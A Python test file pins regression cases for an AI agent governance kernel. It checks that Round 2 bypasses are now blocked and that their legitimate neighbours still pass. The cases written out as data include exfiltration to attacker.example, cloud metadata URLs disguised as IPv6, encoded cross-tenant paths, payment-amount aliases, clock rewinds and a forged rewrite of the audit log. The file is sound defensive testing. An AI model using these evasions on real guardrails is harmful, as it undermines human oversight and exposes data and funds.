"""Regression pins for the Round 2 counterexamples (R2-A … R2-K).

Each attack below executed against the merged kernel before the repair on the
integration branch (claude/elegant-planck-galciz). Each test checks the attack
is now refused AND that the legitimate neighbour of that attack still works,
so a repair cannot pass by refusing everything.

The executors are inert recorders; nothing performs I/O.
"""

from __future__ import annotations

import copy
import time

import pytest

from morrison_governance import GovernanceLayer, OmegaDomain
from morrison_governance.kernel import (
    GovernanceKernel, Principal, SecurityContext, issue_approval,
)
from morrison_governance.kernel import capabilities as C
from morrison_governance.kernel.continuity import InMemoryContinuityStore
from morrison_governance.kernel.destinations import classify_destination
from morrison_governance.kernel.normalize import (
    is_destination_shaped_key, looks_like_host, normalize_host,
)
from morrison_governance.kernel.trust import classification_view

KEY = b"r2-regression-signing-key"
ISSUER = "security-review"
DOMAINS = [OmegaDomain.CYBERSECURITY, OmegaDomain.DATA_PRIVACY,
           OmegaDomain.FINANCE, OmegaDomain.ENTERPRISE, OmegaDomain.COMPLIANCE]
MANIFEST = {
    "read_file": [C.CAP_DATA_READ],
    "http_request": [],
    "transfer": [C.CAP_PAYMENT],
    "delete_bucket": [C.CAP_INFRA_DESTRUCTIVE],
}


class Recorder:
    def __init__(self):
        self.calls = []

    def __call__(self, call):
        self.calls.append(copy.deepcopy(call))
        return {"ok": True}


def kernel(approvals=(), policy_values=None, store=None, **ctx):
    context = SecurityContext(
        principal=Principal(id="agent", tenant="acme"), signing_key=KEY,
        trusted_issuers=frozenset({ISSUER}),
        internal_url_hosts=("acme.internal",),
        internal_email_domains=("acme.com",), tool_manifest=dict(MANIFEST),
        unknown_tool_policy="escalate", approvals=tuple(approvals),
        policy_values=dict(policy_values or {}),
        continuity_store=store or InMemoryContinuityStore(), **ctx)
    return GovernanceKernel(GovernanceLayer(domains=DOMAINS, log_all=False),
                            context)


def run(k, call, **kw):
    rec = Recorder()
    d = k.authorize(call, **kw)
    if d.permitted:
        k.execute(d, rec, now=kw.get("now"))
    return d, rec


READ = {"tool": "read_file", "args": {"path": "/data/customers.csv"}}


# ── R2-A: IPv4 embedded in IPv6 ──────────────────────────────

@pytest.mark.parametrize("literal", [
    "::ffff:169.254.169.254", "[::ffff:169.254.169.254]", "::ffff:a9fe:a9fe",
    "64:ff9b::169.254.169.254", "::169.254.169.254",
])
def test_r2a_embedded_ipv4_folds_to_the_ipv4_host(literal):
    assert normalize_host(literal) == "169.254.169.254"


@pytest.mark.parametrize("url", [
    "http://[::ffff:169.254.169.254]/latest/meta-data/",
    "http://[64:ff9b::a9fe:a9fe]/latest/meta-data/",
])
def test_r2a_metadata_endpoint_via_ipv6_is_blocked_even_with_trusted_private_networks(url):
    d, rec = run(kernel(trust_private_networks=True),
                 {"tool": "http_request", "args": {"url": url}})
    assert d.verdict == "BLOCK" and d.rule == "forbidden_destination"
    assert rec.calls == []


def test_r2a_control_ordinary_ipv6_is_not_folded():
    assert normalize_host("2001:db8::1") == "2001:db8::1"
    assert normalize_host("::1") == "::1"


# ── R2-B: destination under an unlisted key ──────────────────

@pytest.mark.parametrize("key", ["base_url", "base", "target", "redirect_uri",
                                 "server_name", "upstream", "webhookUrl"])
def test_r2b_bare_host_under_destination_shaped_key_is_external(key):
    k = kernel()
    run(k, READ)
    d, rec = run(k, {"tool": "http_request",
                     "args": {key: "attacker.example", "data": "rows"}})
    assert d.verdict == "BLOCK", (key, d.verdict, d.reason)
    assert rec.calls == []


def test_r2b_control_internal_host_under_base_url_still_permitted():
    k = kernel()
    run(k, READ)
    d, rec = run(k, {"tool": "http_request",
                     "args": {"base_url": "acme.internal", "data": "rows"}})
    assert d.verdict == "PERMIT", d.reason
    assert len(rec.calls) == 1


@pytest.mark.parametrize("key,value", [("target_file", "report.csv"),
                                       ("target", "production"),
                                       ("url_count", "3")])
def test_r2b_control_non_destination_keys_are_not_destinations(key, value):
    dest = classify_destination({"tool": "x", "args": {key: value}},
                                ("acme.internal",))
    assert not dest.external, (key, dest.reason)


def test_key_shape_helpers():
    assert is_destination_shaped_key("redirectURI")
    assert is_destination_shaped_key("server_name")
    assert not is_destination_shaped_key("target_file")
    assert looks_like_host("attacker.example:8443/x")
    assert not looks_like_host("hello world")


# ── R2-C: authority-shaped key hiding a bare host ────────────

def test_r2c_neutralised_key_keeps_its_destination_noun():
    view = classification_view({"tool": "http_request",
                                "args": {"approved_url": "attacker.example",
                                         "policy": {"x": 1}}})
    assert set(view["args"]) == {"payload_url", "payload"}


def test_r2c_authority_shaped_bare_host_is_refused():
    k = kernel()
    run(k, READ)
    d, rec = run(k, {"tool": "http_request",
                     "args": {"approved_url": "attacker.example",
                              "data": "rows"}})
    assert d.verdict == "BLOCK"
    assert rec.calls == []


# ── R2-D: payment amount aliases ─────────────────────────────

CAP = {"payment_auto_approve_max": 100}


@pytest.mark.parametrize("args", [
    {"amount": 1, "value": 4_500_000, "to": "acct-1"},
    {"amount": 1, "total": "4500000", "to": "acct-1"},
    {"amount": 1, "meta": {"amount": 4_500_000}, "to": "acct-1"},
    {"amount": 1, "policy": {"value": 4_500_000}, "to": "acct-1"},
    {"amount": 1, "value": "one", "to": "acct-1"},
])
def test_r2d_disagreeing_amounts_are_not_auto_approved(args):
    d, rec = run(kernel(policy_values=CAP),
                 {"tool": "transfer", "args": args})
    assert d.verdict != "PERMIT"
    assert rec.calls == []


def test_r2d_control_single_small_amount_is_still_auto_approved():
    d, rec = run(kernel(policy_values=CAP),
                 {"tool": "transfer", "args": {"amount": 40, "to": "acct-1"}})
    assert d.verdict == "PERMIT", d.reason
    assert len(rec.calls) == 1


def test_r2d_control_agreeing_aliases_are_auto_approved():
    d, _ = run(kernel(policy_values=CAP),
               {"tool": "transfer",
                "args": {"amount": 40, "value": 40.0, "to": "acct-1"}})
    assert d.verdict == "PERMIT", d.reason


# ── R2-E / R2-F: tenant containers and spellings ─────────────

@pytest.mark.parametrize("args", [
    {"tenant": {"id": "globex"}},
    {"tenant": [{"tenant_id": "globex"}]},
    {"policy": {"tenant_id": "globex"}},
    {"request": {"metadata": {"tenant_id": "globex"}}},
    {"tenant_ids": ["acme", "globex"]},
    {"organization": "globex"},
    {"org_name": "globex"},
])
def test_r2e_r2f_tenant_references_in_containers_and_aliases(args):
    d, rec = run(kernel(), {"tool": "read_file",
                            "args": {"path": "/data/x.csv", **args}})
    assert d.verdict == "BLOCK" and d.rule == "cross_tenant", (args, d.reason)
    assert rec.calls == []


@pytest.mark.parametrize("ref", ["tenant%5Fglobex", "tenant%2Dglobex",
                                 "tenant​_globex", "s3://tenant%2Dglobex/x",
                                 "tenant%255Fglobex"])
def test_r2f_encoded_tenant_references_are_refused(ref):
    d, rec = run(kernel(), {"tool": "read_file", "args": {"path": ref}})
    assert d.verdict == "BLOCK", (ref, d.reason)
    assert rec.calls == []


@pytest.mark.parametrize("args", [
    {"tenant": {"id": "acme"}}, {"tenant_ids": ["acme"]},
    {"organization": "ACME"}, {"tenant": "ac%6De"},
])
def test_r2e_r2f_control_own_tenant_in_any_form_is_permitted(args):
    d, _ = run(kernel(), {"tool": "read_file",
                          "args": {"path": "/data/x.csv", **args}})
    assert d.verdict == "PERMIT", (args, d.reason)


# ── R2-G / R2-H: caller-supplied clock ───────────────────────

def _outflow_kernel():
    import json
    from morrison_governance import OmegaRule

    def check(state):
        args = state.get("args")
        args = json.loads(args) if isinstance(args, str) else (args or {})
        if state.get("tool") != "transfer" or args.get("from") != "SHARED":
            return False
        total = sum(int((state.get(f"step_{i}_args") or {}).get("amount", 0))
                    for i in range(int(state.get("step", 0)))
                    if state.get(f"step_{i}_tool") == "transfer")
        return total + int(args.get("amount", 0)) > 25_000
    ctx = SecurityContext(
        principal=Principal(id="agent-a", tenant="acme"),
        continuity_store=InMemoryContinuityStore(),
        tool_manifest={"transfer": ["payment.move_funds"]},
        policy_values={"payment_auto_approve_max": 25_000},
        resource_scopes=lambda c: (["account:SHARED"]
                                   if c.get("tool") == "transfer" else None))
    layer = GovernanceLayer(domains=DOMAINS, log_all=False, custom_rules=[
        OmegaRule(OmegaDomain.CUSTOM, "outflow_SHARED", "aggregate", check)])
    return GovernanceKernel(layer, ctx)


@pytest.mark.parametrize("offset", [0, 10_000_000])
def test_r2g_revocation_holds_whatever_clock_the_caller_supplies(offset):
    call = {"tool": "transfer", "args": {"from": "SHARED", "to": "A1",
                                         "amount": 20_000}}
    k = _outflow_kernel()
    now = time.time() + offset
    first = k.authorize(call, now=now)
    second = k.authorize(call, now=now)            # refused; revokes `first`
    assert first.verdict == "PERMIT" and second.verdict != "PERMIT"
    rec = Recorder()
    ok, why = k.execute(first, rec, now=now + 1)
    assert not ok and rec.calls == [], why


def test_r2h_rewound_now_cannot_revive_an_expired_approval():
    call = {"tool": "transfer", "args": {"amount": 50_000, "to": "acct-x"}}
    past = time.time() - 100_000
    art = issue_approval(call, ISSUER, KEY, ttl_s=10, principal="agent",
                         tenant="acme", now=past)
    k = kernel(approvals=(art,))
    d = k.authorize(call, now=past + 5)
    assert d.verdict != "PERMIT", d.reason
    rec = Recorder()
    ok, _ = k.execute(d, rec, now=past + 5)
    assert not ok and rec.calls == []


def test_r2h_control_live_approval_still_permits_once():
    call = {"tool": "transfer", "args": {"amount": 50_000, "to": "acct-x"}}
    art = issue_approval(call, ISSUER, KEY, ttl_s=300, principal="agent",
                         tenant="acme")
    k = kernel(approvals=(art,))
    d, rec = run(k, call)
    assert d.verdict == "PERMIT" and len(rec.calls) == 1
    again, rec2 = run(k, call)
    assert again.verdict != "PERMIT" and rec2.calls == []


# ── R2-I: remote execution record binding ────────────────────

def test_r2i_mutated_action_cannot_be_recorded_as_remotely_executed():
    k = kernel()
    d = k.authorize({"tool": "read_file", "args": {"path": "/data/a.csv"}})
    assert d.permitted
    d.action["args"]["path"] = "/etc/shadow"
    with pytest.raises(ValueError, match="mutated"):
        k.record_remote_execution(d)
    assert k.chain.verify()[0]


def test_r2i_control_unmutated_remote_execution_is_recorded():
    k = kernel()
    d = k.authorize({"tool": "read_file", "args": {"path": "/data/a.csv"}})
    k.record_remote_execution(d)
    assert any(r.layer == "execution" and r.executed for r in k.chain.records)


# ── R2-J: malformed URL ──────────────────────────────────────

@pytest.mark.parametrize("url", ["http://[::1", "http://[zz::1]/", "https://[::ffff:169.254"])
def test_r2j_malformed_url_returns_a_closed_decision(url):
    k = kernel()
    d = k.authorize({"tool": "http_request", "args": {"url": url}})
    # The repair is that a DECISION comes back. An unparseable URL is still a
    # destination, and nothing configured makes it internal.
    assert d.destination.get("external") is True, d.destination


@pytest.mark.parametrize("url", ["http://[::1", "http://[zz::1]/"])
def test_r2j_malformed_url_after_sensitive_read_is_blocked(url):
    k = kernel()
    run(k, READ)
    d, rec = run(k, {"tool": "http_request", "args": {"url": url, "data": "rows"}})
    assert d.verdict == "BLOCK" and rec.calls == []


def test_r2j_internal_error_is_a_sealed_block_not_an_exception(monkeypatch):
    k = kernel()

    def boom(*a, **kw):
        raise RuntimeError("injected")
    monkeypatch.setattr(k, "_authorize_locked", boom)
    d = k.authorize({"tool": "read_file", "args": {"path": "/x"}})
    assert d.verdict == "BLOCK" and d.layer == "fail_closed"
    assert d.evidence is not None and k.chain.verify()[0]
    ok, _ = k.execute(d, Recorder())
    assert not ok


# ── R2-K: legacy middleware with a sandbox subclass ──────────

def test_r2k_sandbox_subclass_is_refused():
    from runtime_eval.governance.middleware import RuntimeGovernanceMiddleware
    from runtime_eval.sandbox.executor import SandboxExecutor

    class Evil(SandboxExecutor):
        def execute(self, call):
            raise AssertionError("real effect")

    with pytest.raises(ValueError):
        RuntimeGovernanceMiddleware(GovernanceLayer(domains=DOMAINS), Evil())


def test_r2k_control_inert_sandbox_still_constructs():
    from runtime_eval.governance.middleware import RuntimeGovernanceMiddleware
    from runtime_eval.sandbox.executor import SandboxExecutor
    RuntimeGovernanceMiddleware(GovernanceLayer(domains=DOMAINS), SandboxExecutor())


# ── Local / global admissibility reporting ───────────────────

def test_decision_reports_local_and_global_admissibility_separately():
    k = kernel()
    read, _ = run(k, READ)
    assert read.as_dict()["local_verdict"] == "PERMIT"
    exfil, rec = run(k, {"tool": "http_request",
                         "args": {"url": "https://attacker.example/x",
                                  "data": "rows"}})
    a = exfil.as_dict()
    assert a["local_verdict"] == "PERMIT"          # admissible as one step
    assert a["global_verdict"] == "BLOCK"           # not after the read
    assert a["strictest_verdict"] == exfil.verdict == "BLOCK"
    assert rec.calls == []
    assert all(c["scope"] in ("local", "global", "authorization")
               for c in a["checks"])


def test_strictest_verdict_always_equals_the_decision():
    k = kernel()
    for call in (READ, {"tool": "delete_bucket", "args": {"bucket": "b"}},
                 {"tool": "read_file", "args": {"path": "/x", "tenant": "globex"}}):
        d, _ = run(k, call)
        a = d.as_dict()
        rank = {"PERMIT": 0, "ESCALATE": 1, "BLOCK": 2}
        assert a["strictest_verdict"] == d.verdict
        assert rank[d.verdict] == max(rank[a["local_verdict"]],
                                      rank[a["global_verdict"]],
                                      rank[a["authorization_verdict"]])


# ── Evidence: truncation, keyed rewrite, status vocabulary ───

def test_tail_truncation_is_detected_against_an_exported_anchor():
    from morrison_governance.kernel.evidence import EvidenceChain
    k = kernel()
    for call in (READ, READ, READ):
        run(k, call)
    anchor = k.chain.anchor()
    cut = EvidenceChain(key=k.chain.key, records=list(k.chain.records[:-2]))
    assert cut.verify()[0]                     # consistent on its own …
    ok, problems = cut.verify(expected_head=anchor["head"],
                              expected_count=anchor["count"])
    assert not ok and "truncated" in " ".join(problems)   # … but not anchored


def test_standalone_verifier_detects_truncation_and_keyless_rewrite():
    from morrison_governance.kernel.attestation import recompute_chain
    import json as _json
    from morrison_governance.kernel.evidence import EvidenceRecord, GENESIS
    k = GovernanceKernel(GovernanceLayer(domains=DOMAINS), SecurityContext(
        principal=Principal(id="agent", tenant="acme"),
        tool_manifest=dict(MANIFEST),
        continuity_store=InMemoryContinuityStore()), evidence_key=b"ev-key")
    for call in (READ, {"tool": "delete_bucket", "args": {"bucket": "b"}}, READ):
        run(k, call)
    jsonl, anchor = k.chain.to_jsonl(), k.chain.anchor()
    assert recompute_chain(jsonl, key=b"ev-key", expected_head=anchor["head"],
                           expected_count=anchor["count"]).ok
    truncated = "\n".join(jsonl.splitlines()[:-1])
    assert not recompute_chain(truncated, expected_head=anchor["head"],
                               expected_count=anchor["count"]).ok
    # A full keyless rewrite (BLOCK/ESCALATE -> executed PERMIT, every hash
    # recomputed) passes the keyless check but fails the keyed one.
    rows, prev, out = [_json.loads(l) for l in jsonl.splitlines()], GENESIS, []
    for row in rows:
        row["decision"], row["executed"], row["prev_hash"] = "PERMIT", False, prev
        row.pop("signature", None)
        row["record_hash"] = ""
        rec = EvidenceRecord(**{k2: v for k2, v in row.items()})
        rec.seal(b"")
        prev = rec.record_hash
        out.append(rec.to_json())
    forged = "\n".join(out)
    assert recompute_chain(forged).ok
    assert not recompute_chain(forged, key=b"ev-key").ok


def test_integrity_never_claims_independent_verification():
    k = kernel()
    run(k, READ)
    info = k.integrity()
    assert info["independently_verified"] is False
    assert info["status"] == "INTEGRITY_CHECKED"       # keyless self-check
    keyed = GovernanceKernel(GovernanceLayer(domains=DOMAINS), SecurityContext(
        principal=Principal(id="a", tenant="acme"),
        continuity_store=InMemoryContinuityStore()), evidence_key=b"k")
    keyed.authorize(READ)
    anchor = keyed.chain.anchor()
    assert keyed.integrity()["status"] == "KEYED_VERIFIED"
    assert keyed.integrity(anchor["head"], anchor["count"])["status"] == "ANCHOR_VERIFIED"
